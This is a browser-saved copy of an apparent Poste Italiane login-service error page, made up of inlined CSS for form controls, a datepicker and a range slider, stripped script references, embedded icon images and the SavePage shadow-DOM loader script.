        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-selected@2x.png*/ url();
    }
    .has-error .custom-radio {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-error@2x.png*/ url();
    }
    .has-error .custom-radio:hover {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-error-hover@2x.png*/ url();
    }
    .has-error .custom-radio-focused {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-focused@2x.png*/ url();
    }
    .has-error .custom-radio.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-error-selected@2x.png*/ url();
    }
    .has-warning .custom-radio {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-warning@2x.png*/ url();
    }
    .has-warning .custom-radio:hover {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-warning-hover@2x.png*/ url();
    }
    .has-warning .custom-radio-focused {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-focused@2x.png*/ url();
    }
    .has-warning .custom-radio.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-warning-selected@2x.png*/ url();
    }
    .radio.disabled .custom-radio {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled@2x.png*/ url();
    }
    .radio.disabled .custom-radio {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled@2x.png*/ url();
    }
    .radio.disabled .custom-radio.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled-selected@2x.png*/ url();
    }
    .radio.readonly .custom-radio {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled@2x.png*/ url();
    }
    .radio.readonly .custom-radio.selected {
        background-image: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/radio-disabled-selected@2x.png*/ url();
    }
}
</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/applicazioni/trasversali/stili/bootstrap-datepicker.css" type="text/css">/*!
 * Datepicker for Bootstrap
 *
 * Copyright 2012 Stefan Petre
 * Licensed under the Apache License v2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 */

.datepicker {
    top: 0;
    left: 0;
    padding: 16px;
    margin-top: 15px;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    z-index: 1051; /*hover modal*/
    /*.dow {
    border-top: 1px solid #ddd !important;
  }*/
}

.datepicker:before {
    background: #fff none repeat scroll 0 0;
    box-shadow: -4px -2px 4px rgba(0, 0, 0, 0.07);
    content: "";
    display: block;
    height: 18px;
    margin: 20px 0 0;
    position: absolute;
    left: 10%;
    top: -29px;
    transform: rotate(45deg);
    transition: width 0.5s ease 0s, background-color 0.5s ease 0s;
    width: 18px;
    border-left: 1px solid #ccc;
    border-top: 1px solid #ccc;
}
/*
.datepicker:after {
    content: '';
    display: inline-block;
    border-left: 6px solid transparent;
    border-right: 6px solid transparent;
    border-bottom: 6px solid #ffffff;
    position: absolute;
    top: -6px;
    left: 7px;
}
*/
.datepicker > div {
    display: none;
}

.datepicker table {
    width: 100%;
    margin: 0;
}

.datepicker td,
.datepicker th {
    text-align: center;
    width: 20px;
    height: 20px;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
}

.datepicker td.day:hover {
    background: #eeeeee;
    cursor: pointer;
}

.datepicker td.day.disabled {
    color: #eeeeee;
}

.datepicker td.old,
.datepicker td.new {
    color: #999999;
}

.datepicker td.active,
.datepicker td.active:hover {
    color: #ffffff;
    background-color: #006dcc;
    background-image: -moz-linear-gradient(top, #0088cc, #0044cc);
    background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#0088cc), to(#0044cc));
    background-image: -webkit-linear-gradient(top, #0088cc, #0044cc);
    background-image: -o-linear-gradient(top, #0088cc, #0044cc);
    background-image: linear-gradient(to bottom, #0088cc, #0044cc);
    background-repeat: repeat-x;
    filter: progid: DXImageTransform.Microsoft.gradient(startColorstr='#ff0088cc', endColorstr='#ff0044cc', GradientType=0);
    *background-color: #0044cc;
    /* Darken IE7 buttons by default so they stand out more given they won't have borders */
    filter: progid: DXImageTransform.Microsoft.gradient(enabled=false);
    color: #fff;
}

.datepicker td.active:hover,
.datepicker td.active:hover:hover,
.datepicker td.active:focus,
.datepicker td.active:hover:focus,
.datepicker td.active:active,
.datepicker td.active:hover:active,
.datepicker td.active.active,
.datepicker td.active:hover.active,
.datepicker td.active.disabled,
.datepicker td.active:hover.disabled,
.datepicker td.active[disabled],
.datepicker td.active:hover[disabled] {
    color: #787878;
    background-color: #eedc00;
}

.datepicker td.active:active,
.datepicker td.active:hover:active,
.datepicker td.active.active,
.datepicker td.active:hover.active {
    background-color: #003399 \9;
}

.datepicker td span {
    display: block;
    width: 47px;
    height: 54px;
    line-height: 54px;
    float: left;
    margin: 2px;
    cursor: pointer;
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
}

.datepicker td span:hover {
    background: #eeeeee;
}

.datepicker td span.active {
    color: #ffffff;
    background-color: #006dcc;
    background-image: -moz-linear-gradient(top, #0088cc, #0044cc);
    background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#0088cc), to(#0044cc));
    background-image: -webkit-linear-gradient(top, #0088cc, #0044cc);
    background-image: -o-linear-gradient(top, #0088cc, #0044cc);
    background-image: linear-gradient(to bottom, #0088cc, #0044cc);
    background-repeat: repeat-x;
    filter: progid: DXImageTransform.Microsoft.gradient(startColorstr='#ff0088cc', endColorstr='#ff0044cc', GradientType=0);
    border-color: #0044cc #0044cc #002a80;
    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);
    *background-color: #0044cc;
    /* Darken IE7 buttons by default so they stand out more given they won't have borders */
    filter: progid: DXImageTransform.Microsoft.gradient(enabled=false);
    color: #fff;
    text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
}

.datepicker td span.active:hover,
.datepicker td span.active:focus,
.datepicker td span.active:active,
.datepicker td span.active.active,
.datepicker td span.active.disabled,
.datepicker td span.active[disabled] {
    color: #ffffff;
    background-color: #0044cc;
    *background-color: #003bb3;
}

.datepicker td span.active:active,
.datepicker td span.active.active {
    background-color: #003399 \9;
}

.datepicker td span.old {
    color: #999999;
}

.datepicker th.switch {
    width: 145px;
}

.datepicker th.next,
.datepicker th.prev {
    font-size: 21px;
}

.datepicker thead tr:first-child th {
    cursor: pointer;
    text-transform: uppercase;
}

.datepicker thead tr:first-child th:hover {
    background: #eeeeee;
}

.input-append.date .add-on i,
.input-prepend.date .add-on i {
    display: block;
    cursor: pointer;
    width: 16px;
    height: 16px;
}


/* calendar override */

.datepicker {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
}

.datepicker td span {
    width: 60px;
}

.datepicker td.active:hover,
.datepicker td.active:hover:hover,
.datepicker td.active:focus,
.datepicker td.active:hover:focus,
.datepicker td.active:active,
.datepicker td.active:hover:active,
.datepicker td.active.active,
.datepicker td.active.active:hover,
.datepicker td.active.disabled,
.datepicker td.active.disabled:hover,
.datepicker td.active[disabled],
.datepicker td.active[disabled]:hover {
    background-color: #eedc00;
    background-image: none;
    color: #222427;
}

.datepicker td.day {
    color: #222427;
}

.datepicker td.old,
.datepicker td.new {
    color: #ddd;
}

.datepicker th.prev,
.datepicker th.next {
    background: transparent;
    border: none;
}

.datepicker th.switch,
.datepicker .dow {
    border: none;
}

.datepicker td,
.datepicker th {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
    border: 1px solid #ddd;
    padding: 4px !important;
    width: 43px;
    height: 40px;
    font-size: 16px;
}

.datepicker td span.active {
    background-image: none;
}

@media (max-width: 767px) {
    .datepicker td,
    .datepicker th {
        width: 33px;
        height: 34px;
    }
}</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/applicazioni/trasversali/stili/ion.rangeSlider.css" type="text/css">/* Ion.RangeSlider
// css version 2.0.3
// © 2013-2014 Denis Ineshin | IonDen.com
// ===================================================================================================================*/

/* =====================================================================================================================
// RangeSlider */

.irs {
    position: relative; display: block;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
     -khtml-user-select: none;
       -moz-user-select: none;
        -ms-user-select: none;
            user-select: none;
}
    .irs-line {
        position: relative; display: block;
        overflow: hidden;
        outline: none !important;
    }
        .irs-line-left, .irs-line-mid, .irs-line-right {
            position: absolute; display: block;
            top: 0;
        }
        .irs-line-left {
            left: 0; width: 11%;
        }
        .irs-line-mid {
            left: 9%; width: 82%;
        }
        .irs-line-right {
            right: 0; width: 11%;
        }

    .irs-bar {
        position: absolute; display: block;
        left: 0; width: 0;
    }
        .irs-bar-edge {
            position: absolute; display: block;
            top: 0; left: 0;
        }

    .irs-shadow {
        position: absolute; display: none;
        left: 0; width: 0;
    }

    .irs-slider {
        position: absolute; display: block;
        cursor: default;
        z-index: 1;
    }
        .irs-slider.single {

        }
        .irs-slider.from {

        }
        .irs-slider.to {

        }
        .irs-slider.type_last {
            z-index: 2;
        }

    .irs-min {
        position: absolute; display: block;
        left: 0;
        cursor: default;
    }
    .irs-max {
        position: absolute; display: block;
        right: 0;
        cursor: default;
    }

    .irs-from, .irs-to, .irs-single {
        position: absolute; display: block;
        top: 0; left: 0;
        cursor: default;
        white-space: nowrap;
    }

.irs-grid {
    position: absolute; display: none;
    bottom: 0; left: 0;
    width: 100%; height: 20px;
}
.irs-with-grid .irs-grid {
    display: block;
}
    .irs-grid-pol {
        position: absolute;
        top: 0; left: 0;
        width: 1px; height: 8px;
        background: #000;
    }
    .irs-grid-pol.small {
        height: 4px;
    }
    .irs-grid-text {
        position: absolute;
        bottom: 0; left: 0;
        white-space: nowrap;
        text-align: center;
        font-size: 9px; line-height: 9px;
        padding: 0 3px;
        color: #000;
    }

.irs-disable-mask {
    position: absolute; display: block;
    top: 0; left: -1%;
    width: 102%; height: 100%;
    cursor: default;
    background: rgba(0,0,0,0.0);
    z-index: 2;
}
.irs-disabled {
    opacity: 0.4;
}
.lt-ie9 .irs-disabled {
    filter: alpha(opacity=40);
}


.irs-hidden-input {
    position: absolute !important;
    display: block !important;
    top: 0 !important;
    left: 0 !important;
    width: 0 !important;
    height: 0 !important;
    font-size: 0 !important;
    line-height: 0 !important;
    padding: 0 !important;
    margin: 0 !important;
    outline: none !important;
    z-index: -9999 !important;
    background: none !important;
    border-style: solid !important;
    border-color: transparent !important;
}
</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/applicazioni/trasversali/stili/ion.rangeSlider.skinPoste.css" type="text/css">/* Ion.RangeSlider, Simple Skin
// css version 2.0.3
// © Denis Ineshin, 2014    https://github.com/IonDen
// © guybowden, 2014        https://github.com/guybowden
// ===================================================================================================================*/

/* =====================================================================================================================
// Skin details */

.irs {
    height: 55px;
    margin-top: 20px;
}
.irs-with-grid {
    height: 75px;
}
.irs-line {
    height: 1px; top: 35px;
    background: #d3d3d3;
}
    .irs-line-left {
        height: 8px;
    }
    .irs-line-mid {
        height: 8px;
    }
    .irs-line-right {
        height: 8px;
    }

.irs-bar {
    height: 5px; top: 33px;
    background: #0047bb;
}
    .irs-bar-edge {
        height: 5px; top: 33px;
        width: 14px;
        border-right: 0;
        background: #0047bb;
    }

.irs-shadow {
    height: 5px; top: 33px;
    background: #648ed8;
    opacity: 1;
}
.lt-ie9 .irs-shadow {
    filter: alpha(opacity=30);
}

.irs-slider {
    top: 25px;
    width: 22px; height: 22px;
    background: #0047bb;
    border-radius: 22px;
    -moz-border-radius: 22px;
    /*
    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);
    */
    cursor: pointer;
}

.irs-slider.state_hover, .irs-slider:hover {
    background: #0047bb;
}

.irs-min, .irs-max {
    color: #333;
    font-size: 12px; line-height: 1.333;
    text-shadow: none;
    top: 6px;
    padding: 1px 5px;/*
    background: rgba(0,0,0,0.1);*/
}

.lt-ie9 .irs-min, .lt-ie9 .irs-max {
    background: #ccc;
}

.irs-from, .irs-to, .irs-single {
    color: #0047bb;
    font-size: 18px; line-height: 1.333;
    text-shadow: none;
    font-weight: 500;
    padding: 1px 5px;
    background: transparent;
    border-radius: 3px;
    -moz-border-radius: 3px;
}
.lt-ie9 .irs-from, .lt-ie9 .irs-to, .lt-ie9 .irs-single {
    background: #999;
}

.irs-grid {
    height: 27px;
}
.irs-grid-pol {
    opacity: 0.5;
    background: #428bca;
}
.irs-grid-pol.small {
    background: #999;
}

.irs-grid-text {
    bottom: 5px;
    color: #99a4ac;
}

.irs-disabled {
}
</style>
			
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/jquery.min.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/utilita.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/poste-it.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/megamenu-pi.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/scroll-pi.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/nav-tabs-vertical.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/owl.carousel.min.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/slick.min.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/jquery.hc-sticky.min.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/jquery.mobile.custom.min.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/applicazioni/trasversali/javascript/bootstrap-datepicker.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/applicazioni/trasversali/javascript/typeahead.jquery.min.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/applicazioni/trasversali/javascript/custom-form-element.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/applicazioni/trasversali/javascript/ion.rangeSlider.min.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/applicazioni/trasversali/javascript/bootstrap-tagsinput.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/applicazioni/trasversali/javascript/jquery.toaster.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/applicazioni/trasversali/javascript/utilita-app.js"></script>
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/condivise/stili/trasversali/configuratore.css" type="text/css">.configuratore .config-container {
    overflow: hidden;
    background-position: center right;
}

.configuratore .config-container {
    padding: 20px;
    height: 350px;
}

.configuratore h2 {
    margin-top: 30px;
}

.config-container {
    padding: 40px 0;
    background-color: #f0f0f0;
    height: 450px;
}

.config-container-wrap {
    max-height: 310px;
    overflow: auto;
}

.config-container .config-row {
    display: none;
    font-size: 28px;
    font-weight: 300;
    color: #fff;
    width: 100%;
    text-align: center;
}

.config-container .config-row .testo-domanda {
    color: #fff;
    font-size: 28px;
    margin-top: -10px;
}

.config-container .config-row .select-wrapper span {
    color: #fff;
    font-size: 28px;
    padding-right: 3px;
}

.prodotti .configtag {
    display: none;
}


/* spinner */

.prodotti .over {
    display: none;
    width: 100%;
    height: 100%;
    left: 0;
    top: 0;
    position: absolute;
    background-color: #f6f6f6;
}

.prodotti .over img {
    position: relative;
    margin-top: 35px !important;
    display: none;
    margin: 0 auto;
    width: 30px;
}

.config-container .select-wrapper {
    min-width: 120px;
}

.config-container {
    background-position: center;
    background-size: cover;
    background-repeat: no-repeat;
}

#config-spedirericevere {
    background-image: /*savepage-url=/risorse_dt/editoriali/bisogni/bisogni-hero-spedire.jpg*/ url();
}

#config-proteggiti-imprevisti {
    background-image: /*savepage-url=/risorse_dt/editoriali/bisogni/bisogni-hero-proteggiti.jpg*/ url();
}

#config-risparmia-investi {
    background-image: /*savepage-url=/risorse_dt/editoriali/bisogni/bisogni-hero-investi.jpg*/ url();
}

#config-realizzare-progetto {
    background-image: /*savepage-url=/risorse_dt/editoriali/bisogni/bisogni-hero-progetto.jpg*/ url();
}

#config-gestisci-denaro {
    background-image: /*savepage-url=/risorse_dt/editoriali/bisogni/bisogni-hero-progetto.jpg*/ url();
}

#config-paga-trasferisci {
    background-image: /*savepage-url=/risorse_dt/editoriali/bisogni/bisogni-hero-progetto.jpg*/ url();
}

.config-container .form-group {
    margin-bottom: 10px;
}

.config-container span.select-wrapper {
    vertical-align: bottom;
    display: inline-block;
    width: auto;
    /* truncate overflow text */
    /*
    overflow: hidden;
    text-overflow: ellipsis;
    */
}

.config-container .select-wrapper {
    background: /*savepage-url=/risorse_dt/applicazioni/trasversali/immagini/dropdown_white.png*/ url();
    background-repeat: no-repeat;
    background-position: 99% 88%;
}




/* debug */

.config-container .risultato,
.joined {
    margin-top: 40px;
    font-size: 20px;
    color: green;
    width: 100%;
    text-align: center;
    padding: 10px 0px;
    display: none;
}

@media (max-width: 767px) {
    .configuratore .config-container {
        background-position: right 30% center;
    }
}
</style><!--[if lt IE 9]>
			
			
			
				<script type="text/javascript" src="/risorse_dt/bootstrap/js/html5shiv.min.js"></script>
			
			
				<![endif]--><!--[if lt IE 9]>
			
			
			
				<script type="text/javascript" src="/risorse_dt/bootstrap/js/respond.min.js"></script>
			
			
				<![endif]--><!--[if IE 8]>
			
			
				<link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/ie8.css">
			
			
			
				<![endif]--><!--[if lt IE 8]>
			
			
				<link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/ie7-ie6.css">
			
			
			
				<![endif]-->
			
			
			
		
			
			
			
				
			
			
		
			
			
			
		
			
				
			
		
			
				
			
		
			
				
			
		
			
				
			
		
	

			
			<style>.ng-hide { display: none; }
</style>
			
			

	


<script type="text/javascript"></script>	


			
		
<link rel="icon" href="">
<style id="savepage-cssvariables">
  :root {
    --savepage-url-26: url(data:image/png;base64,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);
    --savepage-url-28: url(data:image/png;base64,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);
  }
</style>
<script id="savepage-shadowloader" type="application/javascript">
  "use strict"
  window.addEventListener("DOMContentLoaded",
  function(event)
  {
    savepage_ShadowLoader(5);
  },false);
  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
</script>
<meta name="savepage-url" content="https://idp-poste.poste.it/jod-idp-retail/page/error.jsp">
